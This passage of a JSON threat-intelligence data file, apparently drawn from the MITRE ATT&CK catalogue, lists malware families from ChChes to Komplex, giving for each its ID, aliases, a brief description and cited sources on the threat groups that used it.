    ],
    "description": "[ChChes](https://attack.mitre.org/software/S0144) is a Trojan that appears to be used exclusively by [menuPass](https://attack.mitre.org/groups/G0045). It was used to target Japanese organizations in 2016. Its lack of persistence methods suggests it may be intended as a first-stage tool. (Citation: Palo Alto menuPass Feb 2017) (Citation: JPCERT ChChes Feb 2017) (Citation: PWC Cloud Hopper Technical Annex April 2017)",
    "example_uses": []
  },
  "malware--5bcd5511-6756-4824-a692-e8bb109364af": {
    "id": "S0220",
    "name": "Chaos",
    "examples": [],
    "similar_words": [
      "Chaos"
    ],
    "description": "[Chaos](https://attack.mitre.org/software/S0220) is Linux malware that compromises systems by brute force attacks against SSH services. Once installed, it provides a reverse shell to its controllers, triggered by unsolicited packets. (Citation: Chaos Stolen Backdoor)",
    "example_uses": []
  },
  "malware--b2203c59-4089-4ee4-bfe1-28fa25f0dbfe": {
    "id": "S0107",
    "name": "Cherry Picker",
    "examples": [],
    "similar_words": [
      "Cherry Picker"
    ],
    "description": "[Cherry Picker](https://attack.mitre.org/software/S0107) is a point of sale (PoS) memory scraper. (Citation: Trustwave Cherry Picker)",
    "example_uses": []
  },
  "malware--5a3a31fe-5a8f-48e1-bff0-a753e5b1be70": {
    "id": "S0020",
    "name": "China Chopper",
    "examples": [],
    "similar_words": [
      "China Chopper"
    ],
    "description": "[China Chopper](https://attack.mitre.org/software/S0020) is a [Web Shell](http://attack.mitre.org/techniques/T1100) hosted on Web servers to provide access back into an enterprise network that does not rely on an infected system calling back to a remote command and control server. (Citation: Lee 2013) It has been used by several threat groups. (Citation: Dell TG-3390) (Citation: FireEye Periscope March 2018)",
    "example_uses": []
  },
  "malware--cbf646f1-7db5-4dc6-808b-0094313949df": {
    "id": "S0054",
    "name": "CloudDuke",
    "examples": [],
    "similar_words": [
      "CloudDuke",
      "MiniDionis",
      "CloudLook"
    ],
    "description": "[CloudDuke](https://attack.mitre.org/software/S0054) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) in 2015. (Citation: F-Secure The Dukes) (Citation: Securelist Minidionis July 2015)",
    "example_uses": []
  },
  "malware--da5880b4-f7da-4869-85f2-e0aba84b8565": {
    "id": "S0126",
    "name": "ComRAT",
    "examples": [],
    "similar_words": [
      "ComRAT"
    ],
    "description": "[ComRAT](https://attack.mitre.org/software/S0126) is a remote access tool suspected of being a decedent of [Agent.btz](https://attack.mitre.org/software/S0092) and used by [Turla](https://attack.mitre.org/groups/G0010). (Citation: Symantec Waterbug) (Citation: NorthSec 2015 GData Uroburos Tools)",
    "example_uses": []
  },
  "malware--f4c80d39-ce10-4f74-9b50-a7e3f5df1f2e": {
    "id": "S0244",
    "name": "Comnie",
    "examples": [],
    "similar_words": [
      "Comnie"
    ],
    "description": "[Comnie](https://attack.mitre.org/software/S0244) is a remote backdoor which has been used in attacks in East Asia. (Citation: Palo Alto Comnie)",
    "example_uses": []
  },
  "malware--2eb9b131-d333-4a48-9eb4-d8dec46c19ee": {
    "id": "S0050",
    "name": "CosmicDuke",
    "examples": [],
    "similar_words": [
      "CosmicDuke",
      "TinyBaron",
      "BotgenStudios",
      "NemesisGemina"
    ],
    "description": "[CosmicDuke](https://attack.mitre.org/software/S0050) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2010 to 2015. (Citation: F-Secure The Dukes)",
    "example_uses": []
  },
  "malware--e6ef745b-077f-42e1-a37d-29eecff9c754": {
    "id": "S0046",
    "name": "CozyCar",
    "examples": [],
    "similar_words": [
      "CozyCar",
      "CozyDuke",
      "CozyBear",
      "Cozer",
      "EuroAPT"
    ],
    "description": "[CozyCar](https://attack.mitre.org/software/S0046) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2010 to 2015. It is a modular malware platform, and its backdoor component can be instructed to download and execute a variety of modules with different functionality. (Citation: F-Secure The Dukes)",
    "example_uses": []
  },
  "malware--326af1cd-78e7-45b7-a326-125d2f7ef8f2": {
    "id": "S0115",
    "name": "Crimson",
    "examples": [],
    "similar_words": [
      "Crimson",
      "MSIL/Crimson"
    ],
    "description": "[Crimson](https://attack.mitre.org/software/S0115) is malware used as part of a campaign known as Operation Transparent Tribe that targeted Indian diplomatic and military victims. (Citation: Proofpoint Operation Transparent Tribe March 2016)",
    "example_uses": []
  },
  "malware--a5e91d50-24fa-44ec-9894-39a88f658cea": {
    "id": "S0235",
    "name": "CrossRAT",
    "examples": [],
    "similar_words": [
      "CrossRAT"
    ],
    "description": "[CrossRAT](https://attack.mitre.org/software/S0235) is a cross platform RAT.",
    "example_uses": []
  },
  "malware--d186c1d6-e3ac-4c3d-a534-9ddfeb8c57bb": {
    "id": "S0255",
    "name": "DDKONG",
    "examples": [],
    "similar_words": [
      "DDKONG"
    ],
    "description": "[DDKONG](https://attack.mitre.org/software/S0255) is a malware sample that was part of a campaign by [Rancor](https://attack.mitre.org/groups/G0075). [DDKONG](https://attack.mitre.org/software/S0255) was first seen used in February 2017. (Citation: Rancor Unit42 June 2018)",
    "example_uses": []
  },
  "malware--0852567d-7958-4f4b-8947-4f840ec8d57d": {
    "id": "S0213",
    "name": "DOGCALL",
    "examples": [],
    "similar_words": [
      "DOGCALL"
    ],
    "description": "[DOGCALL](https://attack.mitre.org/software/S0213) is a backdoor used by [ScarCruft](https://attack.mitre.org/groups/G0067) that has been used to target South Korean government and military organizations in 2017. It is typically dropped using a Hangul Word Processor (HWP) exploit. (Citation: FireEye APT37 Feb 2018)",
    "example_uses": []
  },
  "malware--310f437b-29e7-4844-848c-7220868d074a": {
    "id": "S0209",
    "name": "Darkmoon",
    "examples": [],
    "similar_words": [],
    "description": "",
    "example_uses": []
  },
  "malware--b6b3dfc7-9a81-43ff-ac04-698bad48973a": {
    "id": "S0187",
    "name": "Daserf",
    "examples": [],
    "similar_words": [
      "Daserf",
      "Muirim",
      "Nioupale"
    ],
    "description": "[Daserf](https://attack.mitre.org/software/S0187) is a backdoor that has been used to spy on and steal from Japanese, South Korean, Russian, Singaporean, and Chinese victims. Researchers have identified versions written in both Visual C and Delphi. (Citation: Trend Micro Daserf Nov 2017) (Citation: Secureworks BRONZE BUTLER Oct 2017)",
    "example_uses": []
  },
  "malware--8f460983-1bbb-4e7e-8094-f0b5e720f658": {
    "id": "S0243",
    "name": "DealersChoice",
    "examples": [],
    "similar_words": [
      "DealersChoice"
    ],
    "description": "[DealersChoice](https://attack.mitre.org/software/S0243) is a Flash exploitation framework used by [APT28](https://attack.mitre.org/groups/G0007). (Citation: Sofacy DealersChoice)",
    "example_uses": []
  },
  "malware--94379dec-5c87-49db-b36e-66abc0b81344": {
    "id": "S0021",
    "name": "Derusbi",
    "examples": [],
    "similar_words": [
      "Derusbi",
      "PHOTO"
    ],
    "description": "[Derusbi](https://attack.mitre.org/software/S0021) is malware used by multiple Chinese APT groups. (Citation: Novetta-Axiom) (Citation: ThreatConnect Anthem) Both Windows and Linux variants have been observed. (Citation: Fidelis Turbo)",
    "example_uses": []
  },
  "malware--e170995d-4f61-4f17-b60e-04f9a06ee517": {
    "id": "S0200",
    "name": "Dipsind",
    "examples": [],
    "similar_words": [
      "Dipsind"
    ],
    "description": "[Dipsind](https://attack.mitre.org/software/S0200) is a malware family of backdoors that appear to be used exclusively by [PLATINUM](https://attack.mitre.org/groups/G0068). (Citation: Microsoft PLATINUM April 2016)",
    "example_uses": []
  },
  "malware--f36b2598-515f-4345-84e5-5ccde253edbe": {
    "id": "S0281",
    "name": "Dok",
    "examples": [],
    "similar_words": [
      "Dok",
      "Retefe"
    ],
    "description": "[Dok](https://attack.mitre.org/software/S0281) steals banking information through man-in-the-middle  (Citation: objsee mac malware 2017).",
    "example_uses": []
  },
  "malware--e48df773-7c95-4a4c-ba70-ea3d15900148": {
    "id": "S0186",
    "name": "DownPaper",
    "examples": [],
    "similar_words": [
      "DownPaper"
    ],
    "description": "[DownPaper](https://attack.mitre.org/software/S0186) is a backdoor Trojan; its main functionality is to download and run second stage malware. (Citation: ClearSky Charming Kitten Dec 2017)",
    "example_uses": []
  },
  "malware--08d20cd2-f084-45ee-8558-fa6ef5a18519": {
    "id": "S0134",
    "name": "Downdelph",
    "examples": [],
    "similar_words": [
      "Downdelph",
      "Delphacy"
    ],
    "description": "[Downdelph](https://attack.mitre.org/software/S0134) is a first-stage downloader written in Delphi that has been used by [APT28](https://attack.mitre.org/groups/G0007) in rare instances between 2013 and 2015. (Citation: ESET Sednit Part 3)",
    "example_uses": []
  },
  "malware--68dca94f-c11d-421e-9287-7c501108e18c": {
    "id": "S0038",
    "name": "Duqu",
    "examples": [],
    "similar_words": [
      "Duqu"
    ],
    "description": "[Duqu](https://attack.mitre.org/software/S0038) is a malware platform that uses a modular approach to extend functionality after deployment within a target network. (Citation: Symantec W32.Duqu)",
    "example_uses": []
  },
  "malware--687c23e4-4e25-4ee7-a870-c5e002511f54": {
    "id": "S0062",
    "name": "DustySky",
    "examples": [],
    "similar_words": [
      "DustySky",
      "NeD Worm"
    ],
    "description": "[DustySky](https://attack.mitre.org/software/S0062) is multi-stage malware written in .NET that has been used by [Molerats](https://attack.mitre.org/groups/G0021) since May 2015. (Citation: DustySky) (Citation: DustySky2)",
    "example_uses": []
  },
  "malware--63c2a130-8a5b-452f-ad96-07cf0af12ffe": {
    "id": "S0024",
    "name": "Dyre",
    "examples": [],
    "similar_words": [
      "Dyre"
    ],
    "description": "[Dyre](https://attack.mitre.org/software/S0024) is a Trojan that has been used for financial gain. \n (Citation: Symantec Dyre June 2015)",
    "example_uses": []
  },
  "malware--3cab1b76-2f40-4cd0-8d2c-7ed16eeb909c": {
    "id": "S0064",
    "name": "ELMER",
    "examples": [],
    "similar_words": [
      "ELMER"
    ],
    "description": "[ELMER](https://attack.mitre.org/software/S0064) is a non-persistent, proxy-aware HTTP backdoor written in Delphi that has been used by [APT16](https://attack.mitre.org/groups/G0023). (Citation: FireEye EPS Awakens Part 2)",
    "example_uses": []
  },
  "malware--7551188b-8f91-4d34-8350-0d0c57b2b913": {
    "id": "S0081",
    "name": "Elise",
    "examples": [],
    "similar_words": [
      "Elise",
      "BKDR_ESILE",
      "Page"
    ],
    "description": "[Elise](https://attack.mitre.org/software/S0081) is a custom backdoor Trojan that appears to be used exclusively by [Lotus Blossom](https://attack.mitre.org/groups/G0030). It is part of a larger group of\ntools referred to as LStudio, ST Group, and APT0LSTU. (Citation: Lotus Blossom Jun 2015)",
    "example_uses": []
  },
  "malware--0f862b01-99da-47cc-9bdb-db4a86a95bb1": {
    "id": "S0082",
    "name": "Emissary",
    "examples": [],
    "similar_words": [
      "Emissary"
    ],
    "description": "[Emissary](https://attack.mitre.org/software/S0082) is a Trojan that has been used by [Lotus Blossom](https://attack.mitre.org/groups/G0030). It shares code with [Elise](https://attack.mitre.org/software/S0081), with both Trojans being part of a malware group referred to as LStudio. (Citation: Lotus Blossom Dec 2015)",
    "example_uses": []
  },
  "malware--6b62e336-176f-417b-856a-8552dd8c44e1": {
    "id": "S0091",
    "name": "Epic",
    "examples": [],
    "similar_words": [
      "Epic",
      "Tavdig",
      "Wipbot",
      "WorldCupSec",
      "TadjMakhal"
    ],
    "description": "[Epic](https://attack.mitre.org/software/S0091) is a backdoor that has been used by [Turla](https://attack.mitre.org/groups/G0010). (Citation: Kaspersky Turla)",
    "example_uses": []
  },
  "malware--2f1a9fd0-3b7c-4d77-a358-78db13adbe78": {
    "id": "S0152",
    "name": "EvilGrab",
    "examples": [],
    "similar_words": [
      "EvilGrab"
    ],
    "description": "[EvilGrab](https://attack.mitre.org/software/S0152) is a malware family with common reconnaissance capabilities. It has been deployed by [menuPass](https://attack.mitre.org/groups/G0045) via malicious Microsoft Office documents as part of spearphishing campaigns. (Citation: PWC Cloud Hopper Technical Annex April 2017)",
    "example_uses": []
  },
  "malware--fece06b7-d4b1-42cf-b81a-5323c917546e": {
    "id": "S0181",
    "name": "FALLCHILL",
    "examples": [],
    "similar_words": [
      "FALLCHILL"
    ],
    "description": "[FALLCHILL](https://attack.mitre.org/software/S0181) is a RAT that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032) since at least 2016 to target the aerospace, telecommunications, and finance industries. It is usually dropped by other [Lazarus Group](https://attack.mitre.org/groups/G0032) malware or delivered when a victim unknowingly visits a compromised website. (Citation: US-CERT FALLCHILL Nov 2017)",
    "example_uses": []
  },
  "malware--cf8df906-179c-4a78-bd6e-6605e30f6624": {
    "id": "S0267",
    "name": "FELIXROOT",
    "examples": [],
    "similar_words": [
      "FELIXROOT",
      "GreyEnergy mini"
    ],
    "description": "[FELIXROOT](https://attack.mitre.org/software/S0267) is a backdoor that has been used to target Ukrainian victims. (Citation: FireEye FELIXROOT July 2018)",
    "example_uses": []
  },
  "malware--43213480-78f7-4fb3-976f-d48f5f6a4c2a": {
    "id": "S0036",
    "name": "FLASHFLOOD",
    "examples": [],
    "similar_words": [
      "FLASHFLOOD"
    ],
    "description": "[FLASHFLOOD](https://attack.mitre.org/software/S0036) is malware developed by [APT30](https://attack.mitre.org/groups/G0013) that allows propagation and exfiltration of data over removable devices. [APT30](https://attack.mitre.org/groups/G0013) may use this capability to exfiltrate data across air-gaps. (Citation: FireEye APT30)",
    "example_uses": []
  },
  "malware--0e18b800-906c-4e44-a143-b11c72b3448b": {
    "id": "S0173",
    "name": "FLIPSIDE",
    "examples": [],
    "similar_words": [
      "FLIPSIDE"
    ],
    "description": "[FLIPSIDE](https://attack.mitre.org/software/S0173) is a simple tool similar to Plink that is used by [FIN5](https://attack.mitre.org/groups/G0053) to maintain access to victims. (Citation: Mandiant FIN5 GrrCON Oct 2016)",
    "example_uses": []
  },
  "malware--bb3c1098-d654-4620-bf40-694386d28921": {
    "id": "S0076",
    "name": "FakeM",
    "examples": [],
    "similar_words": [
      "FakeM"
    ],
    "description": "[FakeM](https://attack.mitre.org/software/S0076) is a shellcode-based Windows backdoor that has been used by [Scarlet Mimic](https://attack.mitre.org/groups/G0029). (Citation: Scarlet Mimic Jan 2016)",
    "example_uses": []
  },
  "malware--196f1f32-e0c2-4d46-99cd-234d4b6befe1": {
    "id": "S0171",
    "name": "Felismus",
    "examples": [],
    "similar_words": [
      "Felismus"
    ],
    "description": "[Felismus](https://attack.mitre.org/software/S0171) is a modular backdoor that has been used by [Sowbug](https://attack.mitre.org/groups/G0054). (Citation: Symantec Sowbug Nov 2017) (Citation: Forcepoint Felismus Mar 2017)",
    "example_uses": []
  },
  "malware--a5528622-3a8a-4633-86ce-8cdaf8423858": {
    "id": "S0182",
    "name": "FinFisher",
    "examples": [],
    "similar_words": [
      "FinFisher",
      "FinSpy"
    ],
    "description": "[FinFisher](https://attack.mitre.org/software/S0182) is a government-grade commercial surveillance spyware reportedly sold exclusively to government agencies for use in targeted and lawful criminal investigations. It is heavily obfuscated and uses multiple anti-analysis techniques. It has other variants including [Wingbird](https://attack.mitre.org/software/S0176). (Citation: FinFisher Citation) (Citation: Microsoft SIR Vol 21) (Citation: FireEye FinSpy Sept 2017) (Citation: Securelist BlackOasis Oct 2017) (Citation: Microsoft FinFisher March 2018)",
    "example_uses": []
  },
  "malware--ff6840c9-4c87-4d07-bbb6-9f50aa33d498": {
    "id": "S0143",
    "name": "Flame",
    "examples": [],
    "similar_words": [
      "Flame",
      "Flamer",
      "sKyWIper"
    ],
    "description": "Flame is a sophisticated toolkit that has been used to collect information since at least 2010, largely targeting Middle East countries. (Citation: Kaspersky Flame)",
    "example_uses": []
  },
  "malware--4a98e44a-bd52-461e-af1e-a4457de87a36": {
    "id": "S0277",
    "name": "FruitFly",
    "examples": [],
    "similar_words": [
      "FruitFly"
    ],
    "description": "FruitFly is designed to spy on mac users  (Citation: objsee mac malware 2017).",
    "example_uses": []
  },
  "malware--f2e8c7a1-cae1-45c4-baf0-6f21bdcbb2c2": {
    "id": "S0026",
    "name": "GLOOXMAIL",
    "examples": [],
    "similar_words": [
      "GLOOXMAIL",
      "Trojan.GTALK"
    ],
    "description": "[GLOOXMAIL](https://attack.mitre.org/software/S0026) is malware used by [APT1](https://attack.mitre.org/groups/G0006) that mimics legitimate Jabber/XMPP traffic. (Citation: Mandiant APT1)",
    "example_uses": []
  },
  "malware--76abb3ef-dafd-4762-97cb-a35379429db4": {
    "id": "S0168",
    "name": "Gazer",
    "examples": [],
    "similar_words": [
      "Gazer",
      "WhiteBear"
    ],
    "description": "[Gazer](https://attack.mitre.org/software/S0168) is a backdoor used by [Turla](https://attack.mitre.org/groups/G0010) since at least 2016. (Citation: ESET Gazer Aug 2017)",
    "example_uses": []
  },
  "malware--199463de-d9be-46d6-bb41-07234c1dd5a6": {
    "id": "S0049",
    "name": "GeminiDuke",
    "examples": [],
    "similar_words": [
      "GeminiDuke"
    ],
    "description": "[GeminiDuke](https://attack.mitre.org/software/S0049) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2009 to 2012. (Citation: F-Secure The Dukes)",
    "example_uses": []
  },
  "malware--b9799466-9dd7-4098-b2d6-f999ce50b9a8": {
    "id": "S0249",
    "name": "Gold Dragon",
    "examples": [],
    "similar_words": [
      "Gold Dragon"
    ],
    "description": "[Gold Dragon](https://attack.mitre.org/software/S0249) is a Korean-language, data gathering implant that was first observed in the wild in South Korea in July 2017. [Gold Dragon](https://attack.mitre.org/software/S0249) was used along with [Brave Prince](https://attack.mitre.org/software/S0252) and [RunningRAT](https://attack.mitre.org/software/S0253) in operations targeting organizations associated with the 2018 Pyeongchang Winter Olympics. (Citation: McAfee Gold Dragon)",
    "example_uses": []
  },
  "malware--1d1fce2f-0db5-402b-9843-4278a0694637": {
    "id": "S0237",
    "name": "GravityRAT",
    "examples": [],
    "similar_words": [
      "GravityRAT"
    ],
    "description": "[GravityRAT](https://attack.mitre.org/software/S0237) is a remote access tool (RAT) and has been in ongoing development since 2016. The actor behind the tool remains unknown, but two usernames have been recovered that link to the author, which are \"TheMartian\" and \"The Invincible.\" According to the National Computer Emergency Response Team (CERT) of India, the malware has been identified in attacks against organization and entities in India. (Citation: Talos GravityRAT)",
    "example_uses": []
  },
  "malware--f8dfbc54-b070-4224-b560-79aaa5f835bd": {
    "id": "S0132",
    "name": "H1N1",
    "examples": [],
    "similar_words": [
      "H1N1"
    ],
    "description": "[H1N1](https://attack.mitre.org/software/S0132) is a malware variant that has been distributed via a campaign using VBA macros to infect victims. Although it initially had only loader capabilities, it has evolved to include information-stealing functionality. (Citation: Cisco H1N1 Part 1)",
    "example_uses": []
  },
  "malware--0ced8926-914e-4c78-bc93-356fb90dbd1f": {
    "id": "S0151",
    "name": "HALFBAKED",
    "examples": [],
    "similar_words": [
      "HALFBAKED"
    ],
    "description": "[HALFBAKED](https://attack.mitre.org/software/S0151) is a malware family consisting of multiple components intended to establish persistence in victim networks. (Citation: FireEye FIN7 April 2017)",
    "example_uses": []
  },
  "malware--2daa14d6-cbf3-4308-bb8e-213c324a08e4": {
    "id": "S0037",
    "name": "HAMMERTOSS",
    "examples": [],
    "similar_words": [
      "HAMMERTOSS",
      "HammerDuke",
      "NetDuke"
    ],
    "description": "[HAMMERTOSS](https://attack.mitre.org/software/S0037) is a backdoor that was used by [APT29](https://attack.mitre.org/groups/G0016) in 2015. (Citation: FireEye APT29) (Citation: F-Secure The Dukes)",
    "example_uses": []
  },
  "malware--211cfe9f-2676-4e1c-a5f5-2c8091da2a68": {
    "id": "S0214",
    "name": "HAPPYWORK",
    "examples": [],
    "similar_words": [
      "HAPPYWORK"
    ],
    "description": "[Happywork](https://attack.mitre.org/software/S0214) is a downloader used by [ScarCruft](https://attack.mitre.org/groups/G0067) to target South Korean government and financial victims in November 2016. (Citation: FireEye APT37 Feb 2018)",
    "example_uses": []
  },
  "malware--bd0536d7-b081-43ae-a773-cfb057c5b988": {
    "id": "S0246",
    "name": "HARDRAIN",
    "examples": [],
    "similar_words": [
      "HARDRAIN"
    ],
    "description": "[HARDRAIN](https://attack.mitre.org/software/S0246) is a Trojan malware variant reportedly used by the North Korean government. (Citation: US-CERT HARDRAIN March 2018)",
    "example_uses": []
  },
  "malware--007b44b6-e4c5-480b-b5b9-56f2081b1b7b": {
    "id": "S0061",
    "name": "HDoor",
    "examples": [],
    "similar_words": [
      "HDoor",
      "Custom HDoor"
    ],
    "description": "[HDoor](https://attack.mitre.org/software/S0061) is malware that has been customized and used by the [Naikon](https://attack.mitre.org/groups/G0019) group. (Citation: Baumgartner Naikon 2015)",
    "example_uses": []
  },
  "malware--e669bb87-f773-4c7b-bfcc-a9ffebfdd8d4": {
    "id": "S0135",
    "name": "HIDEDRV",
    "examples": [],
    "similar_words": [
      "HIDEDRV"
    ],
    "description": "[HIDEDRV](https://attack.mitre.org/software/S0135) is a rootkit used by [APT28](https://attack.mitre.org/groups/G0007). It has been deployed along with [Downdelph](https://attack.mitre.org/software/S0134) to execute and hide that malware. (Citation: ESET Sednit Part 3) (Citation: Sekoia HideDRV Oct 2016)",
    "example_uses": []
  },
  "malware--7451bcf9-e6e6-4a70-bc3d-1599173d0035": {
    "id": "S0232",
    "name": "HOMEFRY",
    "examples": [],
    "similar_words": [
      "HOMEFRY"
    ],
    "description": "[HOMEFRY](https://attack.mitre.org/software/S0232) is a 64-bit Windows password dumper/cracker that has previously been used in conjunction with other [Leviathan](https://attack.mitre.org/groups/G0065) backdoors. (Citation: FireEye Periscope March 2018)",
    "example_uses": []
  },
  "malware--e066bf86-9cfb-407a-9d25-26fd5d91e360": {
    "id": "S0070",
    "name": "HTTPBrowser",
    "examples": [],
    "similar_words": [
      "HTTPBrowser",
      "Token Control",
      "HttpDump"
    ],
    "description": "[HTTPBrowser](https://attack.mitre.org/software/S0070) is malware that has been used by several threat groups. (Citation: ThreatStream Evasion Analysis) (Citation: Dell TG-3390) It is believed to be of Chinese origin. (Citation: ThreatConnect Anthem)",
    "example_uses": []
  },
  "malware--4b62ab58-c23b-4704-9c15-edd568cd59f8": {
    "id": "S0047",
    "name": "Hacking Team UEFI Rootkit",
    "examples": [],
    "similar_words": [
      "Hacking Team UEFI Rootkit"
    ],
    "description": "[Hacking Team UEFI Rootkit](https://attack.mitre.org/software/S0047) is a rootkit developed by the company Hacking Team as a method of persistence for remote access software. (Citation: TrendMicro Hacking Team UEFI)",
    "example_uses": []
  },
  "malware--eff1a885-6f90-42a1-901f-eef6e7a1905e": {
    "id": "S0170",
    "name": "Helminth",
    "examples": [],
    "similar_words": [
      "Helminth"
    ],
    "description": "[Helminth](https://attack.mitre.org/software/S0170) is a backdoor that has at least two variants - one written in VBScript and PowerShell that is delivered via a macros in Excel spreadsheets, and one that is a standalone Windows executable. (Citation: Palo Alto OilRig May 2016)",
    "example_uses": []
  },
  "malware--5967cc93-57c9-404a-8ffd-097edfa7bdfc": {
    "id": "S0087",
    "name": "Hi-Zor",
    "examples": [],
    "similar_words": [
      "Hi-Zor"
    ],
    "description": "[Hi-Zor](https://attack.mitre.org/software/S0087) is a remote access tool (RAT) that has characteristics similar to [Sakula](https://attack.mitre.org/software/S0074). It was used in a campaign named INOCNATION. (Citation: Fidelis Hi-Zor)",
    "example_uses": []
  },
  "malware--95047f03-4811-4300-922e-1ba937d53a61": {
    "id": "S0009",
    "name": "Hikit",
    "examples": [],
    "similar_words": [
      "Hikit"
    ],
    "description": "[Hikit](https://attack.mitre.org/software/S0009) is malware that has been used by [Axiom](https://attack.mitre.org/groups/G0001) for late-stage persistence and exfiltration after the initial compromise. (Citation: Novetta-Axiom)",
    "example_uses": []
  },
  "malware--73a4793a-ce55-4159-b2a6-208ef29b326f": {
    "id": "S0203",
    "name": "Hydraq",
    "examples": [],
    "similar_words": [
      "Hydraq",
      "Aurora",
      "9002 RAT"
    ],
    "description": "[Hydraq](https://attack.mitre.org/software/S0203) is a data-theft trojan first used by [Elderwood](https://attack.mitre.org/groups/G0066) in the 2009 Google intrusion known as Operation Aurora, though variations of this trojan have been used in more recent campaigns by other Chinese actors, possibly including [APT17](https://attack.mitre.org/groups/G0025). (Citation: MicroFocus 9002 Aug 2016) (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Trojan.Hydraq Jan 2010) (Citation: ASERT Seven Pointed Dagger Aug 2015) (Citation: FireEye DeputyDog 9002 November 2013) (Citation: ProofPoint GoT 9002 Aug 2017) (Citation: FireEye Sunshop Campaign May 2013) (Citation: PaloAlto 3102 Sept 2015)",
    "example_uses": []
  },
  "malware--5be33fef-39c0-4532-84ee-bea31e1b5324": {
    "id": "S0189",
    "name": "ISMInjector",
    "examples": [],
    "similar_words": [
      "ISMInjector"
    ],
    "description": "[ISMInjector](https://attack.mitre.org/software/S0189) is a Trojan used to install another [OilRig](https://attack.mitre.org/groups/G0049) backdoor, ISMAgent. (Citation: OilRig New Delivery Oct 2017)",
    "example_uses": []
  },
  "malware--c8b6cc43-ce61-42ae-87f3-a5f10526f952": {
    "id": "S0259",
    "name": "InnaputRAT",
    "examples": [],
    "similar_words": [
      "InnaputRAT"
    ],
    "description": "[InnaputRAT](https://attack.mitre.org/software/S0259) is a remote access tool that can exfiltrate files from a victim’s machine. [InnaputRAT](https://attack.mitre.org/software/S0259) has been seen out in the wild since 2016. (Citation: ASERT InnaputRAT April 2018)",
    "example_uses": []
  },
  "malware--47afe41c-4c08-485e-b062-c3bd209a1cce": {
    "id": "S0260",
    "name": "InvisiMole",
    "examples": [],
    "similar_words": [
      "InvisiMole"
    ],
    "description": "[InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been used by threat actors since at least 2013. [InvisiMole](https://attack.mitre.org/software/S0260) has two backdoor modules called RC2FM and RC2CL that are used to perform post-exploitation activities. It has been discovered on compromised victims in the Ukraine and Russia. (Citation: ESET InvisiMole June 2018)",
    "example_uses": []
  },
  "malware--8beac7c2-48d2-4cd9-9b15-6c452f38ac06": {
    "id": "S0015",
    "name": "Ixeshe",
    "examples": [],
    "similar_words": [
      "Ixeshe"
    ],
    "description": "[Ixeshe](https://attack.mitre.org/software/S0015) is a malware family that has been used since 2009 to attack targets in East Asia. (Citation: Moran 2013)",
    "example_uses": []
  },
  "malware--8ae43c46-57ef-47d5-a77a-eebb35628db2": {
    "id": "S0044",
    "name": "JHUHUGIT",
    "examples": [],
    "similar_words": [
      "JHUHUGIT",
      "Trojan.Sofacy",
      "Seduploader",
      "JKEYSKW",
      "Sednit",
      "GAMEFISH",
      "SofacyCarberp"
    ],
    "description": "[JHUHUGIT](https://attack.mitre.org/software/S0044) is malware used by [APT28](https://attack.mitre.org/groups/G0007). It is based on Carberp source code and serves as reconnaissance malware. (Citation: Kaspersky Sofacy) (Citation: F-Secure Sofacy 2015) (Citation: ESET Sednit Part 1) (Citation: FireEye APT28 January 2017)",
    "example_uses": []
  },
  "malware--de6cb631-52f6-4169-a73b-7965390b0c30": {
    "id": "S0201",
    "name": "JPIN",
    "examples": [],
    "similar_words": [
      "JPIN"
    ],
    "description": "[JPIN](https://attack.mitre.org/software/S0201) is a custom-built backdoor family used by [PLATINUM](https://attack.mitre.org/groups/G0068). Evidence suggests developers of [JPIN](https://attack.mitre.org/software/S0201) and [Dipsind](https://attack.mitre.org/software/S0200) code bases were related in some way. (Citation: Microsoft PLATINUM April 2016)",
    "example_uses": []
  },
  "malware--234e7770-99b0-4f65-b983-d3230f76a60b": {
    "id": "S0163",
    "name": "Janicab",
    "examples": [],
    "similar_words": [
      "Janicab"
    ],
    "description": "[Janicab](https://attack.mitre.org/software/S0163) is an OS X trojan that relied on a valid developer ID and oblivious users to install it. (Citation: Janicab)",
    "example_uses": []
  },
  "malware--3c02fb1f-cbdb-48f5-abaf-8c81d6e0c322": {
    "id": "S0215",
    "name": "KARAE",
    "examples": [],
    "similar_words": [
      "KARAE"
    ],
    "description": "[KARAE](https://attack.mitre.org/software/S0215) is a backdoor typically used by [APT37](https://attack.mitre.org/groups/G0067) as first-stage malware. (Citation: FireEye APT37 Feb 2018)",
    "example_uses": []
  },
  "malware--11e36d5b-6a92-4bf9-8eb7-85eb24f59e22": {
    "id": "S0271",
    "name": "KEYMARBLE",
    "examples": [],
    "similar_words": [
      "KEYMARBLE"
    ],
    "description": "[KEYMARBLE](https://attack.mitre.org/software/S0271) is a Trojan that has reportedly been used by the North Korean government. (Citation: US-CERT KEYMARBLE Aug 2018)",
    "example_uses": []
  },
  "malware--7dbb67c7-270a-40ad-836e-c45f8948aa5a": {
    "id": "S0156",
    "name": "KOMPROGO",
    "examples": [],
    "similar_words": [
      "KOMPROGO"
    ],
    "description": "[KOMPROGO](https://attack.mitre.org/software/S0156) is a signature backdoor used by [APT32](https://attack.mitre.org/groups/G0050) that is capable of process, file, and registry management. (Citation: FireEye APT32 May 2017)",
    "example_uses": []
  },
  "malware--26fed817-e7bf-41f9-829a-9075ffac45c2": {
    "id": "S0088",
    "name": "Kasidet",
    "examples": [],
    "similar_words": [
      "Kasidet"
    ],
    "description": "[Kasidet](https://attack.mitre.org/software/S0088) is a backdoor that has been dropped by using malicious VBA macros. (Citation: Zscaler Kasidet)",
    "example_uses": []
  },
  "malware--536be338-e2ef-4a6b-afb6-8d5568b91eb2": {
    "id": "S0265",
    "name": "Kazuar",
    "examples": [],
    "similar_words": [
      "Kazuar"
    ],
    "description": "[Kazuar](https://attack.mitre.org/software/S0265) is a fully featured, multi-platform backdoor Trojan written using the Microsoft .NET framework. (Citation: Unit 42 Kazuar May 2017)",
    "example_uses": []
  },
  "malware--4b072c90-bc7a-432b-940e-016fc1c01761": {
    "id": "S0276",
    "name": "Keydnap",
    "examples": [],
    "similar_words": [
      "Keydnap",
      "OSX/Keydnap"
    ],
    "description": "This piece of malware steals the content of the user's keychain while maintaining a permanent backdoor  (Citation: OSX Keydnap malware).",
    "example_uses": []
  },
  "malware--f108215f-3487-489d-be8b-80e346d32518": {
    "id": "S0162",
    "name": "Komplex",
    "examples": [],
    "similar_words": [
      "Komplex"
    ],
